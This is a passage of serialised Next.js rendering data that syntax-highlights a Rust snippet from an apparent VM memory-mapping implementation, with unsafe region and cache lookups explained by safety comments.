token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n714:[\"$\",\"span\",\"code-segment-187\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n715:[\"$\",\"span\",\"code-segment-188\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\n716:[\"$\",\"span\",\"code-segment-189\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n717:[\"$\",\"span\",\"code-segment-190\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n718:[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[19]}]\n719:[\"$\",\"span\",\"code-segment-192\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n71a:[\"$\",\"span\",\"code-segment-193\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n71b:[\"$\",\"span\",\"code-segment-194\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index \"]}]\n71c:[\"$\",\"span\",\"code-segment-195\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\n71d:[\"$\",\"span\",\"code-segment-196\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n71e:[\"$\",\"span\",\"code-segment-197\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\n71f:[\"$\",\"span\",\"code-segment-198\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n720:[\"$\",\"span\",\"code-segment-199\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n721:[\"$\",\"span\",\"code-segment-200\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n722:[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelec"])</script><script>self.__next_f.push([1,"t\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[20]}]\n723:[\"$\",\"span\",\"code-segment-202\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n724:[\"$\",\"span\",\"code-segment-203\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}]\n725:[\"$\",\"span\",\"code-segment-204\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n726:[\"$\",\"span\",\"code-segment-205\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"None\"]}]\n727:[\"$\",\"span\",\"code-segment-206\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n728:[\"$\",\"span\",\"code-segment-207\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n729:[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[21]}]\n72a:[\"$\",\"span\",\"code-segment-209\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n72b:[\"$\",\"span\",\"code-segment-210\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n72c:[\"$\",\"span\",\"code-segment-211\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n72d:[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[22]}]\n72e:[\"$\",\"span\",\"code-segment-213\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n72f:[\"$\",\"span\",\"code-segment-214\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Safety:\"]}]\n730:[\"$\",\"span\",\"code-segment-215\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n731:[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highli"])</script><script>self.__next_f.push([1,"ghter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[23]}]\n732:[\"$\",\"span\",\"code-segment-217\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n733:[\"$\",\"span\",\"code-segment-218\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// we check for index==0 above, and by construction if we get here index\"]}]\n734:[\"$\",\"span\",\"code-segment-219\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n735:[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[24]}]\n736:[\"$\",\"span\",\"code-segment-221\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n737:[\"$\",\"span\",\"code-segment-222\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// must be contained in region\"]}]\n738:[\"$\",\"span\",\"code-segment-223\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n739:[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[25]}]\n73a:[\"$\",\"span\",\"code-segment-225\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n73b:[\"$\",\"span\",\"code-segment-226\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n73c:[\"$\",\"span\",\"code-segment-227\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region \"]}]\n73d:[\"$\",\"span\",\"code-segment-228\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n73e:[\"$\",\"span\",\"code-segment-229\",{\"className\":\"$undefined\",\"st"])</script><script>self.__next_f.push([1,"yle\":{},\"children\":[\" \"]}]\n73f:[\"$\",\"span\",\"code-segment-230\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}]\n740:[\"$\",\"span\",\"code-segment-231\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n741:[\"$\",\"span\",\"code-segment-232\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n742:[\"$\",\"span\",\"code-segment-233\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n743:[\"$\",\"span\",\"code-segment-234\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n744:[\"$\",\"span\",\"code-segment-235\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n745:[\"$\",\"span\",\"code-segment-236\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"regions\"]}]\n746:[\"$\",\"span\",\"code-segment-237\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n747:[\"$\",\"span\",\"code-segment-238\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_unchecked\"]}]\n748:[\"$\",\"span\",\"code-segment-239\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n749:[\"$\",\"span\",\"code-segment-240\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index \"]}]\n74a:[\"$\",\"span\",\"code-segment-241\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}]\n74b:[\"$\",\"span\",\"code-segment-242\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n74c:[\"$\",\"span\",\"code-segment-243\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\n74d:[\"$\",\"span\",\"code-segment-244\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n74e:[\"$\",\"span\",\"code-segment-245\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n74f:[\"$\",\"span\",\"code-segment-246\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n750:[\"$\",\"span\",\"code-segment-247\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n751:[\"$\",\"span\",\"code-segment-248\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n752:[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-"])</script><script>self.__next_f.push([1,"syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[26]}]\n753:[\"$\",\"span\",\"code-segment-250\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n754:[\"$\",\"span\",\"code-segment-251\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n755:[\"$\",\"span\",\"code-segment-252\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n756:[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[27]}]\n757:[\"$\",\"span\",\"code-segment-254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n758:[\"$\",\"span\",\"code-segment-255\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}]\n759:[\"$\",\"span\",\"code-segment-256\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n75a:[\"$\",\"span\",\"code-segment-257\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n75b:[\"$\",\"span\",\"code-segment-258\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n75c:[\"$\",\"span\",\"code-segment-259\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n75d:[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[28]}]\n75e:[\"$\",\"span\",\"code-segment-261\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n75f:[\"$\",\"span\",\"code-segment-262\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n760:[\"$\",\"span\",\"code-segment-263\",{\"className\":\"$u"])</script><script>self.__next_f.push([1,"ndefined\",\"style\":{},\"children\":[\"\\n\"]}]\n761:[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[29]}]\n762:[\"$\",\"span\",\"code-segment-265\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n763:[\"$\",\"span\",\"code-segment-266\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n764:[\"$\",\"span\",\"code-segment-267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n765:[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[30]}]\n766:[\"$\",\"span\",\"code-segment-269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n767:[\"$\",\"span\",\"code-segment-270\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n768:[\"$\",\"span\",\"code-segment-271\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n769:[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[31]}]\n76a:[\"$\",\"span\",\"code-segment-273\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n76b:[\"$\",\"span\",\"code-segment-274\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n76c:[\"$\",\"span\",\"code-segment-25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n76d:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\""])</script><script>self.__next_f.push([1,"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n76e:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n76f:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n770:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n771:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n772:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n773:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n774:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        access_type\"]}]\n775:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n776:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n777:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccessType\"]}]\n778:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n779:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n77a:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n77b:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        vm_addr\"]}]\n77c:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"c"])</script><script>self.__next_f.push([1,"olor\":\"#ccc\"},\"children\":[\":\"]}]\n77d:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n77e:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n77f:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n780:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n781:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n782:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n783:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n784:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n785:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}]\n786:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n787:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}]\n788:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n789:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n78a:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}]\n78b:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n78c:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n78d:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Box\"]}]\n78e:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"token token\",\"style\":{"])</script><script>self.__next_f.push([1,"\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n78f:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"dyn\"]}]\n790:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n791:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"std\"]}]\n792:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n793:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"error\"]}]\n794:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n795:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}]\n796:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\n797:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n798:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n799:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n79a:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n79b:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n79c:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Safety:\"]}]\n79d:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n79e:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba"])</script><script>self.__next_f.push([1,"(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n79f:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n7a0:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// \u0026mut references to the mapping cache are only created internally from methods that do not\"]}]\n7a1:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n7a2:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n7a3:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n7a4:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// invoke each other. UnalignedMemoryMapping is !Sync, so the cache reference below is\"]}]\n7a5:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n7a6:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\n7a7:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n7a8:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// guaranteed to be unique.\"]}]\n7a9:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n7aa:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"margin"])</script><script>self.__next_f.push([1,"Right\":\"1em\"},\"children\":[12]}]\n7ab:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n7ac:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n7ad:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cache \"]}]\n7ae:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n7af:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7b0:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}]\n7b1:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7b2:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n7b3:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7b4:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n7b5:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n7b6:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7b7:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n7b8:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n7b9:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n7ba:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cache\"]}]\n7bb:[\"$\",\"span\",\"code-segment-104\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n7bc:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}]\n7bd:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n7be:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"token token\",\"s"])</script><script>self.__next_f.push([1,"tyle\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n7bf:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7c0:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n7c1:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n7c2:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n7c3:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber 